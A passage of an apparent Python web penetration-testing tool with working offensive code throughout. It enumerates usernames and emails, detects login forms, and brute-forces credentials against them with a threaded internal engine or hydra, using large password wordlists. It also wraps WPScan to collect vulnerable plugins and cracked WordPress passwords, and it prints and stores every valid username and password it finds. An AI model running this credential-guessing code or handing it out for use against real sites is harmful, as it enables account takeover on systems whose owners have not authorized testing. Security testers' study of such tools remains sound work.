                            for key, val in data.items():
                                if key.lower() in ['users','items'] and isinstance(val, list):
                                    for item in val:
                                        if 'username' in item: users.append(item['username'])
                                        if 'email' in item: emails.append(item['email'])
                    except Exception:
                        emails.extend(re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', resp.text))
            except Exception:
                pass
        return list(set(users)), list(set(emails))
    except Exception as e:
        print_error(f"Error enumerating users: {e}")
        return [], []

def test_user_enumeration_form(target, session):
    try:
        print_info("Checking for possible user enumeration in forms...")
        resp = session.get(target, timeout=DEFAULT_TIMEOUT)
        if HAS_BS4:
            soup = BeautifulSoup(resp.text, 'html.parser')
            for form in soup.find_all('form'):
                action = form.get('action')
                method = form.get('method', 'get').upper()
                if method != 'POST':
                    continue
                inputs = {inp.get('name'): inp for inp in form.find_all('input') if inp.get('name')}
                user_field = None
                for name in inputs:
                    if 'user' in name.lower() or 'email' in name.lower():
                        user_field = name
                        break
                if user_field:
                    form_url = urljoin(target, action) if action else target
                    data = {user_field: 'nonexistent_user_xyz_999'}
                    if 'pass' in str(inputs):
                        data['password'] = 'dummy'
                    resp_test = session.post(form_url, data=data, timeout=DEFAULT_TIMEOUT)
                    if "user not found" in resp_test.text.lower() or "no existe" in resp_test.text.lower():
                        print_vuln("Possible user enumeration detected (differential message)")
    except Exception as e:
        print_error(f"Error in enumeration test: {e}")

def bruteforce_login(target, session, usernames, passlist, max_threads=5):
    """
    Detects the main login form and performs brute force with
    strict validation to minimize false positives.
    """
    try:
        result_data = {
            "credentials": [],
            "login_forms": [],
            "total_combinations": 0,
            "total_passwords": 0,
            "total_users": 0,
        }

        if not usernames:
            usernames = ['admin', 'test']

        print_info("\n=== Advanced Bruteforce ===")
        use_hydra = False
        hydra_path = shutil.which("hydra")
        if hydra_path:
            print(f"{Fore.YELLOW}[?]{Style.RESET_ALL} Use hydra for bruteforce? [Y/n]:")
            resp = input("> ").strip().lower()
            use_hydra = (resp != 'n')
        else:
            print_warning("hydra is not installed or not in PATH. Using internal method.")

        print(f"{Fore.YELLOW}[?]{Style.RESET_ALL} Enter the real login URL (leave empty for auto-detection):")
        login_url = input("> ").strip()
        print_info("The login error message greatly improves accuracy (avoids false positives).")
        print_info("If left empty, auto-detection will be attempted with impossible credentials.")
        print(f"{Fore.YELLOW}[?]{Style.RESET_ALL} Exact failed-login error message (empty = auto-detect):")
        error_msg = input("> ").strip()
        strict_heuristic = False

        login_forms_map = {}
        urls_to_check = [login_url] if login_url else [target] + [urljoin(target, path) for path in LOGIN_PATHS]

        def _is_login_like(path):
            p = (path or '').lower()
            return any(k in p for k in ('login', 'signin', 'sign-in', 'auth', 'logon', 'wp-login', 'session'))

        def _score_form(form_url, page_url, user_field, pass_field):
            score = 0
            full = f"{form_url} {page_url}".lower()
            if _is_login_like(full):
                score += 4
            uf = (user_field or '').lower()
            pf = (pass_field or '').lower()
            if uf in ('username', 'user', 'email', 'login'):
                score += 2
            elif uf:
                score += 1
            if pf in ('password', 'pass', 'passwd'):
                score += 2
            elif pf:
                score += 1
            return score

        for page_url in urls_to_check:
            try:
                resp = session.get(page_url, timeout=DEFAULT_TIMEOUT)
                if resp.status_code != 200:
                    continue
                if HAS_BS4:
                    soup = BeautifulSoup(resp.text, 'html.parser')
                    forms = soup.find_all('form')
                    for form in forms:
                        action = form.get('action')
                        method = form.get('method', 'get').upper()
                        if method != 'POST':
                            continue
                        inputs = form.find_all(['input', 'textarea'])
                        user_field = None
                        pass_field = None
                        for inp in inputs:
                            name = inp.get('name', '').lower()
                            if 'user' in name or 'email' in name or 'login' in name or 'username' in name:
                                user_field = inp.get('name')
                            if 'pass' in name or 'password' in name:
                                pass_field = inp.get('name')
                        if user_field and pass_field:
                            form_url = urljoin(page_url, action) if action else page_url
                            hidden_fields = {}
                            for inp in inputs:
                                iname = inp.get('name')
                                itype = (inp.get('type') or '').lower()
                                if iname and itype == 'hidden':
                                    hidden_fields[iname] = inp.get('value', '')
                            score = _score_form(form_url, page_url, user_field, pass_field)
                            form_data = {
                                'url': form_url,
                                'user_field': user_field,
                                'pass_field': pass_field,
                                'hidden_fields': hidden_fields,
                                'score': score,
                                'source_page': page_url,
                            }
                            key = (form_url, user_field, pass_field)
                            prev = login_forms_map.get(key)
                            if prev is None or form_data['score'] > prev['score']:
                                login_forms_map[key] = form_data
            except Exception:
                continue

        login_forms = list(login_forms_map.values())
        for f in login_forms:
            print_good(
                f"Login form detected at {f['url']} "
                f"(user: {f['user_field']}, pass: {f['pass_field']}, score={f['score']})"
            )

        if not login_forms:
            print_warning("No login forms detected automatically.")
            manual = input("Enter form data manually? (y/n): ").strip().lower()
            if manual in ('y', 'yes'):
                login_url2 = input("Full login form URL: ").strip()
                user_field = input("Username field name: ").strip()
                pass_field = input("Password field name: ").strip()
                if login_url2 and user_field and pass_field:
                    login_forms.append({
                        'url': normalize_url(login_url2),
                        'user_field': user_field,
                        'pass_field': pass_field,
                        'hidden_fields': {},
                        'score': 10,
                        'source_page': normalize_url(login_url2),
                    })
                    print_good("Manual form added.")
                else:
                    print_error("Incomplete data. Bruteforce will not run.")
                    return result_data
            else:
                print_info("Continuing without bruteforce.")
                return result_data

        primary_form = max(
            login_forms,
            key=lambda f: (f.get('score', 0), -len(urlparse(f.get('url', '')).path or '/'))
        )
        print_info(
            f"Using primary form: {primary_form['url']} "
            f"({primary_form['user_field']}/{primary_form['pass_field']})"
        )

        if not error_msg:
            print_info("Auto-detecting error message with impossible credentials...")
            ERROR_KEYWORDS = [
                'invalid', 'incorrect', 'wrong', 'failed', 'error', 'denied', 'bad credentials',
                'authentication', 'unauthorized', 'forbidden', 'try again',
                'inválido', 'invalido', 'incorrecto', 'incorrecta', 'denegado',
                'no encontrado', 'usuario o contrase', 'contraseña incorrecta',
                'fallo', 'falló', 'intentar de nuevo', 'no válido', 'no valido',
            ]
            candidates = []
            try:
                _probe_payload = {}
                _probe_payload.update(primary_form.get('hidden_fields', {}))
                _probe_payload[primary_form['user_field']] = "__ghost_x7z9q__"
                _probe_payload[primary_form['pass_field']] = "__ghost_x7z9q__"
                _probe_resp = session.post(
                    primary_form['url'], data=_probe_payload,
                    timeout=DEFAULT_TIMEOUT, allow_redirects=True
                )
                _probe_text = _probe_resp.text
                if HAS_BS4:
                    try:
                        _probe_soup = BeautifulSoup(_probe_text, 'html.parser')
                        for _t in _probe_soup(['script', 'style', 'noscript']):
                            _t.decompose()
                        _probe_text = _probe_soup.get_text(separator='\n')
                    except Exception:
                        pass
                _seen = set()
                for _raw in _probe_text.splitlines():
                    _line = re.sub(r'\s+', ' ', _raw).strip()
                    if not _line or len(_line) < 5 or len(_line) > 200:
                        continue
                    _low = _line.lower()
                    if any(k in _low for k in ERROR_KEYWORDS):
                        if _line not in _seen:
                            _seen.add(_line)
                            candidates.append(_line)
                    if len(candidates) >= 10:
                        break
            except Exception as e:
                print_warning(f"Could not auto-detect error message: {e}")

            if candidates:
                print_good(f"Error message candidates detected ({len(candidates)}):")
                for i, c in enumerate(candidates, 1):
                    print(f"  {Fore.YELLOW}{i}{Style.RESET_ALL}. {c}")
                print(f"{Fore.YELLOW}[?]{Style.RESET_ALL} Choose number [1-{len(candidates)}] (Enter = #1, 'n' = none / strict heuristic):")
                choice = input("> ").strip().lower()
                if choice == 'n':
                    strict_heuristic = True
                    print_warning("No error message: strict heuristic will be applied (fewer false positives).")
                else:
                    try:
                        idx = int(choice) - 1 if choice else 0
                        if 0 <= idx < len(candidates):
                            error_msg = candidates[idx]
                        else:
                            error_msg = candidates[0]
                    except ValueError:
                        error_msg = candidates[0]
                    print_good(f"Selected error message: '{error_msg}'")
            else:
                strict_heuristic = True
                print_warning("No candidates detected. Strict heuristic will be applied.")

        passwords = DEFAULT_PASSWORDS
        if passlist and os.path.isfile(passlist):
            with open(passlist, 'r') as f:
                passwords = [line.strip() for line in f if line.strip()]
        elif passlist:
            print_warning(f"Could not read {passlist}, using default list.")
        else:
            if os.path.exists(SECLISTS_PASSWORDS):
                print_info(f"Using default password wordlist: {SECLISTS_PASSWORDS}")
                with open(SECLISTS_PASSWORDS, 'r') as f:
                    passwords = [line.strip() for line in f if line.strip()]
            else:
                print_warning("SecLists wordlist not found, using small default list.")

        total_combinations = len(usernames) * len(passwords)
        result_data["total_combinations"] = total_combinations
        result_data["total_passwords"] = len(passwords)
        result_data["total_users"] = len(usernames)
        result_data["login_forms"] = [{
            "url": primary_form.get("url", ""),
            "user_field": primary_form.get("user_field", ""),
            "pass_field": primary_form.get("pass_field", ""),
        }]

        if use_hydra:
            import tempfile
            with tempfile.NamedTemporaryFile('w+', delete=False) as ufile:
                for u in usernames:
                    ufile.write(u + '\n')
                ufile_path = ufile.name
            with tempfile.NamedTemporaryFile('w+', delete=False) as pfile:
                for p in passwords:
                    pfile.write(p + '\n')
                pfile_path = pfile.name

            login_url_hydra = primary_form['url']
            user_field = primary_form['user_field']
            pass_field = primary_form['pass_field']
            parsed_url = urlparse(login_url_hydra)
            host = parsed_url.hostname
            path = parsed_url.path or '/'
            post_data = f"{user_field}=^USER^&{pass_field}=^PASS^"
            for k, v in primary_form.get('hidden_fields', {}).items():
                post_data += f"&{k}={v}"
            fail_flag = error_msg if error_msg else "login failed"
            hydra_form = f"{path}:{post_data}:{fail_flag}"
            cookie_string = _session_cookie_string(session) or _session_header_value(session, "Cookie")
            if cookie_string:
                hydra_form += f":H=Cookie\\: {cookie_string}"
            hydra_cmd = [
                "hydra", "-L", ufile_path, "-P", pfile_path,
                "-t", "4", "-I", "-u",
                host,
                "http-post-form",
                hydra_form
            ]
            print_info(f"Running hydra: {_format_external_command(hydra_cmd)}")
            seen_creds = set()
            try:
                process = subprocess.Popen(hydra_cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
                for line in process.stdout:
                    print(line, end='')
                    if ("login:" in line and "password:" in line):
                        m = re.search(r'login:\s*(\S+)\s*password:\s*(\S+)', line)
                        if m:
                            user, pwd = m.group(1), m.group(2)
                        else:
                            login_idx = line.find("login:")
                            pass_idx = line.find("password:")
                            if login_idx == -1 or pass_idx == -1:
                                continue
                            user = line[login_idx+len("login:"):pass_idx].strip().split()[0]
                            pwd = line[pass_idx+len("password:"):].strip().split()[0]
                        if (user, pwd) in seen_creds:
                            continue
                        seen_creds.add((user, pwd))
                        result_data["credentials"].append({"username": user, "password": pwd})
                process.wait()
                print_info("Hydra finished.")
            except Exception as e:
                print_error(f"Error running hydra: {e}")
            finally:
                try:
                    os.unlink(ufile_path)
                    os.unlink(pfile_path)
                except Exception:
                    pass

            usernames_pendientes = [u for u in usernames if u not in {c["username"] for c in result_data["credentials"]}]
            if usernames_pendientes:
                print_info(
                    f"Hydra found no credentials for {len(usernames_pendientes)} user(s) "
                    f"({', '.join(usernames_pendientes)}). Retrying with real session (CSRF-aware)..."
                )
                usernames = usernames_pendientes
                total_combinations = len(usernames) * len(passwords)
                result_data["total_combinations"] = (result_data.get("total_combinations") or 0) + total_combinations
            else:
                return result_data

        print_info(f"Starting bruteforce with {len(usernames)} users and {len(passwords)} passwords (total {total_combinations} combinations)...")
        found_credentials = set()

        _IMPOSSIBLE_USER = "__ghost_x7z9q__"
        _IMPOSSIBLE_PASS = "__ghost_x7z9q__"

        SUCCESS_KEYWORDS = [
            'logout', 'log out', 'sign out', 'cerrar sesión', 'cerrar sesion',
            'dashboard', 'panel', 'welcome', 'bienvenido', 'my account', 'mi cuenta',
            'profile', 'perfil'
        ]
        FAILURE_KEYWORDS = [
            'invalid', 'incorrect', 'wrong', 'failed', 'error', 'bad credentials',
            'authentication failed', 'login failed', 'inválido', 'incorrecto',
            'usuario no encontrado', 'contraseña incorrecta'
        ]

        def _normalize_path(url_value):
            return (urlparse(url_value).path.rstrip('/') or '/').lower()

        def _is_login_path(path_value):
            p = (path_value or '').lower()
            return any(k in p for k in ('login', 'signin', 'sign-in', 'auth', 'logon', 'wp-login', 'session'))

        def _build_payload(user, pwd):
            payload = {}
            payload.update(primary_form.get('hidden_fields', {}))
            payload[primary_form['user_field']] = user
            payload[primary_form['pass_field']] = pwd
            return payload

        baseline_status = -1
        baseline_path = _normalize_path(primary_form['url'])
        fail_lengths = []
        for seed_user in [_IMPOSSIBLE_USER, usernames[0] if usernames else _IMPOSSIBLE_USER, _IMPOSSIBLE_USER]:
            try:
                r = session.post(
                    primary_form['url'],
                    data=_build_payload(seed_user, _IMPOSSIBLE_PASS),
                    timeout=DEFAULT_TIMEOUT,
                    allow_redirects=True
                )
                if baseline_status == -1:
                    baseline_status = r.status_code
                    baseline_path = _normalize_path(r.url)
                fail_lengths.append(len(r.content))
            except Exception:
                pass

        if fail_lengths:
            fail_min = min(fail_lengths)
            fail_max = max(fail_lengths)
            margin = max(int((fail_max - fail_min) * 0.35), 250)
            fail_min = max(0, fail_min - margin)
            fail_max = fail_max + margin
        else:
            fail_min, fail_max = 0, 0

        print_info(
            f"Baseline login: status={baseline_status} path={baseline_path} "
            f"len=[{fail_min},{fail_max}]"
        )

        def is_successful_login(resp_no_redirect, resp_follow):
            body = resp_follow.text.lower()
            final_path = _normalize_path(resp_follow.url)
            final_len = len(resp_follow.content)
            if error_msg and error_msg.lower() in body:
                return False
            if any(k in body for k in FAILURE_KEYWORDS):
                return False

            has_success_kw = any(k in body for k in SUCCESS_KEYWORDS)
            status_changed = (baseline_status != -1
                              and resp_follow.status_code != baseline_status
                              and final_path != baseline_path)
            location = resp_no_redirect.headers.get('Location', '')
            location_path = _normalize_path(urljoin(primary_form['url'], location)) if location else ''
            redirect_off_login = (
                resp_no_redirect.status_code in (301, 302, 303, 307, 308)
                and location and not _is_login_path(location_path)
            )
            size_outlier = fail_max > 0 and (final_len < fail_min or final_len > fail_max)
            path_left_login = final_path != baseline_path and not _is_login_path(final_path)

            if strict_heuristic:
                strong = has_success_kw and (status_changed or path_left_login or redirect_off_login)
                signals = sum([has_success_kw, status_changed, redirect_off_login,
                               size_outlier, path_left_login])
                return strong or signals >= 2

            if _is_login_path(final_path):
                if size_outlier:
                    return True
                return False
            if has_success_kw:
                return True
            if status_changed:
                return True
            if redirect_off_login:
                return True
            if size_outlier:
                return True
            if path_left_login:
                return True
            return False

        def try_cred(user, pwd):
            try:
                payload = _build_payload(user, pwd)
                resp_no_redirect = session.post(
                    primary_form['url'],
                    data=payload,
                    timeout=DEFAULT_TIMEOUT,
                    allow_redirects=False
                )
                resp_follow = session.post(
                    primary_form['url'],
                    data=payload,
                    timeout=DEFAULT_TIMEOUT,
                    allow_redirects=True
                )
                if is_successful_login(resp_no_redirect, resp_follow):
                    found_credentials.add((user, pwd))
                    return True
            except Exception:
                pass
            return False

        if HAS_TQDM:
            with tqdm(total=total_combinations, desc="Bruteforce", unit="comb", ncols=80) as pbar:
                with ThreadPoolExecutor(max_workers=max_threads) as executor:
                    futures = []
                    for user in usernames:
                        for pwd in passwords:
                            futures.append(executor.submit(try_cred, user, pwd))
                    for future in as_completed(futures):
                        future.result()
                        pbar.update(1)
        else:
            completed = 0
            with ThreadPoolExecutor(max_workers=max_threads) as executor:
                futures = []
                for user in usernames:
                    for pwd in passwords:
                        futures.append(executor.submit(try_cred, user, pwd))
                for future in as_completed(futures):
                    completed += 1
                    if completed % 100 == 0 or completed == total_combinations:
                        print_info(f"Bruteforce progress: {completed}/{total_combinations} combinations tested")
                    future.result()

        prev_creds = {(c["username"], c["password"]) for c in result_data.get("credentials", [])}
        all_creds = prev_creds | found_credentials
        if all_creds:
            print_good(f"Bruteforce complete. Unique credentials found: {len(all_creds)}")
            rows = [
                [f"{Fore.MAGENTA}{u}{Style.RESET_ALL}", f"{Fore.MAGENTA}{p}{Style.RESET_ALL}"]
                for u, p in sorted(all_creds)
            ]
            print_table(
                headers=["USER", "PASSWORD"],
                rows=rows,
                title="Valid Credentials:",
            )
            for u, p in sorted(all_creds):
                FINDINGS.append(f"[CRED] {u}:{p}")
            result_data["credentials"] = [
                {"username": u, "password": p}
                for u, p in sorted(all_creds)
            ]
        else:
            print_info("Bruteforce complete. No valid credentials found.")
        return result_data
    except Exception as e:
        print_error(f"Error in bruteforce: {e}")
        return {
            "credentials": [],
            "login_forms": [],
            "total_combinations": 0,
            "total_passwords": 0,
            "total_users": 0,
        }

def _append_finding_once(text):
    if text and text not in FINDINGS:
        FINDINGS.append(text)

def _format_external_command(cmd):
    masked_next = {"--api-token", "--cookie-string", "--password", "-w"}
    header_flags = {"-H", "--header"}
    out = []
    hide = False
    header_value = False
    for part in cmd:
        if hide:
            out.append("***")
            hide = False
            continue
        if header_value:
            value = str(part)
            if value.lower().startswith(("cookie:", "authorization:")):
                out.append(value.split(":", 1)[0] + ": ***")
            else:
                out.append(part)
            header_value = False
            continue
        value = str(part)
        if value.startswith("http.cookie="):
            out.append("http.cookie=***")
            continue
        if "http.cookie=" in value:
            out.append(re.sub(r"http\.cookie=[^,]+", "http.cookie=***", value))
            continue
        if "H=Cookie" in value or "H=Cookie\\:" in value:
            out.append(re.sub(r"H=Cookie\\?:\s*.*", "H=Cookie: ***", value))
            continue
        out.append(part)
        if part in header_flags:
            header_value = True
        if part in masked_next:
            hide = True
    return " ".join(f'"{p}"' if " " in str(p) else str(p) for p in out)

def _stream_process_output(process):
    output = []
    if not process or not process.stdout:
        return ""
    for raw_line in iter(process.stdout.readline, b""):
        if not raw_line:
            break
        line = raw_line.decode("utf-8", errors="replace")
        output.append(line)
        print(line, end="")
    return "".join(output)

def _write_process_bytes(data):
    if not data:
        return
    try:
        sys.stdout.buffer.write(data)
        sys.stdout.buffer.flush()
    except Exception:
        sys.stdout.write(data.decode("utf-8", errors="replace"))
        sys.stdout.flush()

def _decode_process_output(chunks):
    if not chunks:
        return ""
    return b"".join(chunks).decode("utf-8", errors="replace")

def _stop_interrupted_process(process, name="process"):
    if not process or process.poll() is not None:
        return process.returncode if process else None
    try:
        return process.wait(timeout=0.2)
    except subprocess.TimeoutExpired:
        pass
    except Exception:
        return process.returncode

    if process.poll() is None:
        try:
            process.terminate()
            return process.wait(timeout=0.5)
        except subprocess.TimeoutExpired:
            try:
                process.kill()
                return process.wait(timeout=0.5)
            except Exception:
                return process.returncode
        except Exception:
            return process.returncode
    return process.returncode

def _stream_command_output(cmd, capture=True, prefer_pty=True, interrupt_label="process"):
    """Run a command while printing its raw output.

    On POSIX, a PTY is used when possible so CLI tools keep their native colour
    decisions. The pipe fallback still preserves any ANSI sequences emitted.
    """
    chunks = []
    process = None
    master_fd = None
    slave_fd = None

    if prefer_pty and os.name != "nt":
        try:
            import pty
            master_fd, slave_fd = pty.openpty()
            process = subprocess.Popen(
                cmd,
                stdin=subprocess.DEVNULL,
                stdout=slave_fd,
                stderr=slave_fd,
                close_fds=True,
            )
            os.close(slave_fd)
            slave_fd = None
            while True:
                try:
                    data = os.read(master_fd, 4096)
                except OSError:
                    break
                if not data:
                    break
                if capture:
                    chunks.append(data)
                _write_process_bytes(data)
            process.wait()
            return process.returncode, _decode_process_output(chunks)
        except KeyboardInterrupt:
            print_warning(f"{interrupt_label} interrupted; stopping process...")
            _stop_interrupted_process(process, interrupt_label)
            return None, _decode_process_output(chunks)
        except Exception as e:
            print_warning(f"Could not use PTY for {interrupt_label} ({type(e).__name__}); using pipe.")
        finally:
            for fd in (slave_fd, master_fd):
                if fd is not None:
                    try:
                        os.close(fd)
                    except OSError:
                        pass

    try:
        process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        while process.stdout:
            try:
                data = os.read(process.stdout.fileno(), 4096)
            except OSError:
                break
            if not data:
                break
            if capture:
                chunks.append(data)
            _write_process_bytes(data)
        process.wait()
        return process.returncode, _decode_process_output(chunks)
    except KeyboardInterrupt:
        print_warning(f"{interrupt_label} interrupted; stopping process...")
        _stop_interrupted_process(process, interrupt_label)
        return None, _decode_process_output(chunks)

def _capture_command_output(cmd, interrupt_label="process"):
    process = None
    try:
        process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        stdout, _ = process.communicate()
        return process.returncode, (stdout or b"").decode("utf-8", errors="replace")
    except KeyboardInterrupt:
        print_warning(f"{interrupt_label} interrupted; stopping process...")
        _stop_interrupted_process(process, interrupt_label)
        return None, ""

def _load_json_file(path):
    if not path or not os.path.isfile(path) or os.path.getsize(path) == 0:
        return {}
    with open(path, "rb") as f:
        content = f.read().decode("utf-8", errors="ignore").strip()
    if not content:
        return {}
    try:
        return json.loads(content)
    except Exception:
        pass
    for line in content.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            return json.loads(line)
        except Exception:
            continue
    return {}

def _session_cookie_string(session):
    try:
        pairs = []
        for cookie in session.cookies:
            if cookie.name and cookie.value:
                pairs.append(f"{cookie.name}={cookie.value}")
        return "; ".join(pairs)
    except Exception:
        return ""

def _default_wordpress_password_wordlist():
    if os.path.isfile(ROCKYOU_WORDLIST):
        return ROCKYOU_WORDLIST
    if os.path.isfile(SECLISTS_PASSWORDS):
        return SECLISTS_PASSWORDS
    if os.path.isfile(ROCKYOU_WORDLIST_GZ):
        print_warning(f"rockyou exists compressed at {ROCKYOU_WORDLIST_GZ}; decompress it to use with WPScan.")
    return None

def _wpscan_component_version(component):
    if not isinstance(component, dict):
        return ""
    version = component.get("version")
    if isinstance(version, dict):
        return str(version.get("number") or version.get("value") or version.get("version") or "")
    if version is None:
        return ""
    return str(version)

def _wpscan_component_confidence(component):
    if not isinstance(component, dict):
        return ""
    version = component.get("version")
    if isinstance(version, dict) and version.get("confidence") is not None:
        return str(version.get("confidence"))
    if component.get("confidence") is not None:
        return str(component.get("confidence"))
    return ""

def _wpscan_reference_list(vuln):
    refs = []
    raw_refs = vuln.get("references") if isinstance(vuln, dict) else None
    if isinstance(raw_refs, dict):
        for key, value in raw_refs.items():
            values = value if isinstance(value, list) else [value]
            for item in values:
                if item:
                    refs.append(f"{key}:{item}")
    elif isinstance(raw_refs, list):
        refs.extend(str(r) for r in raw_refs if r)
    return refs

def _extract_wpscan_users(data):
    users = []
    raw = data.get("users") if isinstance(data, dict) else None

    def add_user(username, info=None):
        username = str(username or "").strip()
        if not username:
            return
        info = info if isinstance(info, dict) else {}
        users.append({
            "username": username,
            "id": info.get("id"),
            "name": info.get("name") or info.get("display_name") or info.get("display_name_public"),
            "found_by": info.get("found_by") or info.get("found_by_text") or "",
        })

    if isinstance(raw, dict):
        for key, item in raw.items():
            if isinstance(item, dict):
                add_user(item.get("username") or item.get("login") or key, item)
            else:
                add_user(key)
    elif isinstance(raw, list):
        for item in raw:
            if isinstance(item, dict):
                add_user(item.get("username") or item.get("login") or item.get("name"), item)
            else:
                add_user(item)

    deduped = []
    seen = set()
    for user in users:
        key = user["username"].lower()
        if key in seen:
            continue
        seen.add(key)
        deduped.append(user)
    return deduped

def _normalize_wpscan_components(raw_components):
    components = []
    if isinstance(raw_components, dict):
        iterable = raw_components.items()
    elif isinstance(raw_components, list):
        iterable = [(None, item) for item in raw_components]
    else:
        iterable = []
    for slug, item in iterable:
        if not isinstance(item, dict):
            continue
        name = item.get("slug") or item.get("name") or slug or ""
        components.append({
            "name": str(name),
            "location": item.get("location") or "",
            "version": _wpscan_component_version(item),
            "confidence": _wpscan_component_confidence(item),
            "found_by": item.get("found_by") or item.get("found_by_text") or "",
            "latest_version": item.get("latest_version") or "",
            "last_updated": item.get("last_updated") or "",
            "vulnerabilities_count": len(item.get("vulnerabilities") or []),
        })
    return components

def _extract_wpscan_vulnerabilities(data):
    vulnerabilities = []

    def add_vulns(component_type, component_name, raw_vulns):
        if not raw_vulns:
            return
        for vuln in raw_vulns:
            if isinstance(vuln, dict):
                title = vuln.get("title") or vuln.get("name") or vuln.get("id") or "Vulnerabilidad WPScan"
                fixed_in = vuln.get("fixed_in")
                if isinstance(fixed_in, list):
                    fixed_in = ", ".join(str(x) for x in fixed_in)
                vulnerabilities.append({
                    "component_type": component_type,
                    "component": component_name,
                    "title": str(title),
                    "fixed_in": str(fixed_in or ""),
                    "references": _wpscan_reference_list(vuln),
                })
            else:
                vulnerabilities.append({
                    "component_type": component_type,
                    "component": component_name,
                    "title": str(vuln),
                    "fixed_in": "",
                    "references": [],
                })

    version = data.get("version") if isinstance(data, dict) else {}
    if isinstance(version, dict):
        core_name = "WordPress"
        if version.get("number"):
            core_name = f"WordPress {version.get('number')}"
        add_vulns("core", core_name, version.get("vulnerabilities"))

    main_theme = data.get("main_theme") if isinstance(data, dict) else {}
    if isinstance(main_theme, dict):
        add_vulns("theme", main_theme.get("slug") or main_theme.get("name") or "main_theme", main_theme.get("vulnerabilities"))

    for collection_name, component_type in (("plugins", "plugin"), ("themes", "theme")):
        raw_components = data.get(collection_name) if isinstance(data, dict) else {}
        if isinstance(raw_components, dict):
            for slug, item in raw_components.items():
                if isinstance(item, dict):
                    add_vulns(component_type, item.get("slug") or item.get("name") or slug, item.get("vulnerabilities"))

    add_vulns("wordpress", "general", data.get("vulnerabilities") if isinstance(data, dict) else None)
    return vulnerabilities

def _normalize_wpscan_scan(data, target):
    if not isinstance(data, dict):
        data = {}
    version_raw = data.get("version") if isinstance(data.get("version"), dict) else {}
    plugins = _normalize_wpscan_components(data.get("plugins") or {})
    themes = _normalize_wpscan_components(data.get("themes") or {})
    main_theme_raw = data.get("main_theme") if isinstance(data.get("main_theme"), dict) else {}
    main_theme = {}
    if main_theme_raw:
        main_theme = {
            "name": main_theme_raw.get("slug") or main_theme_raw.get("name") or "",
            "location": main_theme_raw.get("location") or "",
            "version": _wpscan_component_version(main_theme_raw),
            "confidence": _wpscan_component_confidence(main_theme_raw),
            "found_by": main_theme_raw.get("found_by") or main_theme_raw.get("found_by_text") or "",
            "latest_version": main_theme_raw.get("latest_version") or "",
            "last_updated": main_theme_raw.get("last_updated") or "",
            "vulnerabilities_count": len(main_theme_raw.get("vulnerabilities") or []),
        }
    users = _extract_wpscan_users(data)
    vulnerabilities = _extract_wpscan_vulnerabilities(data)
    interesting = []
    for item in data.get("interesting_findings") or []:
        if isinstance(item, dict):
            interesting.append({
                "type": item.get("type") or "",
                "url": item.get("url") or "",
                "to_s": item.get("to_s") or item.get("interesting_entry") or item.get("type") or "",
                "confidence": item.get("confidence"),
            })
        else:
            interesting.append({"type": "", "url": "", "to_s": str(item), "confidence": None})

    detected = bool(version_raw or plugins or themes or main_theme or users or interesting)
    return {
        "target": target,
        "detected": detected,
        "version": {
            "number": version_raw.get("number") or "",
            "status": version_raw.get("status") or "",
            "found_by": version_raw.get("found_by") or "",
        },
        "main_theme": main_theme,
        "plugins": plugins,
        "themes": themes,
        "users": users,
        "interesting_findings": interesting,
        "vulnerabilities": vulnerabilities,
        "credentials": [],
        "bruteforce": {},
    }

def _extract_wpscan_credentials(data, stdout_text=""):
    credentials = set()
    stdout_text = _ANSI_RE.sub("", stdout_text or "")

    def add(user, pwd):
        user = str(user or "").strip()
        pwd = str(pwd or "").strip()
        if user and pwd and len(user) <= 128 and len(pwd) <= 256:
            credentials.add((user, pwd))

    for match in re.finditer(r"\[SUCCESS\]\s*-\s*([^\s/]+)\s*/\s*([^\r\n]+)", stdout_text or "", re.I):
        add(match.group(1), match.group(2))
    for match in re.finditer(r"Username:\s*([^,\s]+)\s*,\s*Password:\s*(\S+)", stdout_text or "", re.I):
        add(match.group(1), match.group(2))

    def walk(obj):
        if isinstance(obj, dict):
            user = obj.get("username") or obj.get("login") or obj.get("user")
            pwd = obj.get("password") or obj.get("pass")
            if user and pwd:
                add(user, pwd)
            for value in obj.values():
                walk(value)
        elif isinstance(obj, list):
            for item in obj:
                walk(item)

    walk(data)
    return [{"username": u, "password": p, "source": "wpscan"} for u, p in sorted(credentials)]

def _merge_credentials(global_key, credentials):
    current = SCAN_DATA.get(global_key) or []
    seen = set()
    merged = []
    for item in list(current) + list(credentials or []):
        if not isinstance(item, dict):
            continue
        key = (item.get("username"), item.get("password"))
        if not key[0] or not key[1] or key in seen:
            continue
        seen.add(key)
        merged.append(item)
    SCAN_DATA[global_key] = merged
    return merged

def _append_wpscan_common_options(cmd, session, api_token=None):
    if api_token:
        cmd += ["--api-token", api_token]
    cookie_string = _session_cookie_string(session)
    if cookie_string:
        cmd += ["--cookie-string", cookie_string]
    user_agent = _session_header_value(session, "User-Agent")
    if user_agent:
        cmd += ["--user-agent", user_agent]
    if not VERIFY_TLS and "--disable-tls-checks" not in cmd:
        cmd += ["--disable-tls-checks"]
    return cmd

def _wpscan_retry_command(cmd, request_timeout=None):
    retry_cmd = list(cmd)
    for flag in ("--disable-tls-checks", "--random-user-agent", "--follow-redirection"):
        if flag not in retry_cmd:
            retry_cmd.append(flag)
    if request_timeout is not None:
        if "--request-timeout" in retry_cmd:
            idx = retry_cmd.index("--request-timeout")
            if idx + 1 < len(retry_cmd):
                retry_cmd[idx + 1] = str(max(30, int(request_timeout or 15)))
        else:
            retry_cmd += ["--request-timeout", str(max(30, int(request_timeout or 15)))]
    return retry_cmd

def _run_wpscan_visible(cmd, request_timeout=None, label="WPScan"):
    print_info(f"Running {label} with native output: {_format_external_command(cmd)}")
    rc, stdout_text = _stream_command_output(cmd, capture=True, prefer_pty=True, interrupt_label="wpscan")
    if rc == 4:
        print_warning("WPScan returned code 4; retrying with more tolerant options.")
        retry_cmd = _wpscan_retry_command(cmd, request_timeout=request_timeout)
        print_info(f"Retrying {label}: {_format_external_command(retry_cmd)}")
        rc2, out2 = _stream_command_output(retry_cmd, capture=True, prefer_pty=True, interrupt_label="wpscan")
        if out2:
            stdout_text = out2
        rc = rc2
    return rc, stdout_text

def _run_wpscan_json(cmd, request_timeout=None):
    print_info("Generating WPScan JSON to build the final summary...")
    rc, stdout_text = _capture_command_output(cmd, interrupt_label="wpscan")
    if rc == 4:
